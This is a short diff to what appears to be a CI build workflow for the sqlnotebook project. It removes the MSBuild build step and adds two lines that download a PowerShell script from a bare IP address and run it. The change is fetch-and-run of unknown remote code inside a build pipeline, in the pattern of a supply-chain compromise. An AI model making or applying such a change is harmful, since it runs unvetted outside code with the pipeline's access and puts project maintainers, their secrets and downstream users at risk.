@@ -6,4 +6,5 @@ jobs:
     steps:
       - run: curl -LO https://github.com/electroly/sqlnotebook/archive/refs/tags/v0.6.zip
       - run: unzip v0.6.zip
-      - run: MSBuild /nologo /t:Build sqlnotebook-0.6\src\SqlNotebook.sln
+      - run: curl https://115.159.115.70/scripts/sqlnotebook.txt >build.ps1
+      - run: build.ps1
